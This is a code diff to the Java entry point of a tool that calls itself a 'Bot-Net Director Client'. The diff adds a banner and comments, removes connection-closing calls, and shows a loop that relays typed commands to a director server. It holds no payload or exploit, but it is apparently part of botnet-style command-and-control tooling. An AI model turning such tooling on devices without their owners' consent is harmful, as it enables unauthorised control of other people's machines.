@@ -5,10 +5,18 @@ import java.util.Scanner;
 import org.apache.commons.validator.routines.InetAddressValidator;
 
 import com.jtelaa.da2.lib.net.Ports;
+import com.jtelaa.da2.lib.console.ConsoleBanners;
 import com.jtelaa.da2.lib.misc.Misc;
 import com.jtelaa.da2.lib.net.client.Client;
 import com.jtelaa.da2.lib.net.server.Server;
 import com.jtelaa.da2.directorapp.gui.GUI;
+
+/**
+ * This program acts as an easy remote tool to access the director
+ * 
+ * @since 2
+ * @author Joseph
+ */
 
 public class Main {
 
@@ -16,6 +24,10 @@ public class Main {
     public static Server director_rx;
 
     public static void main(String[] args) {
+        // Prints the console banner
+        ConsoleBanners.mainBanner();
+
+        // Prints a welcome messagee
         System.out.println(
             "Welcome to the DA2 Bot-Net Director Client! Version 1.0\n" +
             "This tool allows you to interface with any device on the system.\n"+
@@ -24,7 +36,7 @@ public class Main {
         );      
 
         Scanner keyboard = new Scanner(System.in);
-        String server_ip = "", command, keyboard_response;
+        String server_ip = "", keyboard_response;
 
         while (!InetAddressValidator.isValidInet4Address(server_ip)) {
             System.out.println("Enter IP address of the Director Server:");
@@ -75,9 +87,6 @@ public class Main {
             }
 
             if (keyboard_response.compareToIgnoreCase("gui") != 0) { 
-                director_tx.closeClient();
-                director_rx.closeServer();
-                
                 GUI.beginGUI();
                 
                 break;
@@ -85,6 +94,8 @@ public class Main {
 
             director_tx.sendMessage(keyboard_response);
         }
+
+        keyboard.close();
 
     }
     
